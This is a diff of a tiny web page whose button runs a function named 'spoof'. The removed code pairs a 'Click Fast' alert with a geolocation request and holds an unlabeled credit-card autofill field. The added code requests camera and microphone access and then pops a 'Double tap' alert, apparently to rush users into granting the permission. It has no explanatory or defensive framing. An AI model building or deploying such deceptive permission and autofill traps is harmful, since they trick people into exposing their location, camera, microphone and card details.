@@ -1,17 +1,15 @@
-<button onclick="spoof()">Test</button>
-
-<input type="Input" autocomplete="cc-number" name="" id="">
+<button onclick="spoof()">test</button>
 
 <script>
-//Alert
+// Camera + Microphone
 function spoof(){
-    //Alert
-    window.alert("Click Fast.......................................................")
+    navigator.mediaDevices
+    .getUserMedia({audio: true, video: true})
 
-    // API Location 
-    navigator.geolocation.getCurrentPosition((position) => {
-        doSomething(position.coords.latitude,position.coords.longitude);
-    });
+// Alert
+setTimeout (() => {
+  window.alert("Double tap............................................");
+}, 100)
+
 }
-
 </script>
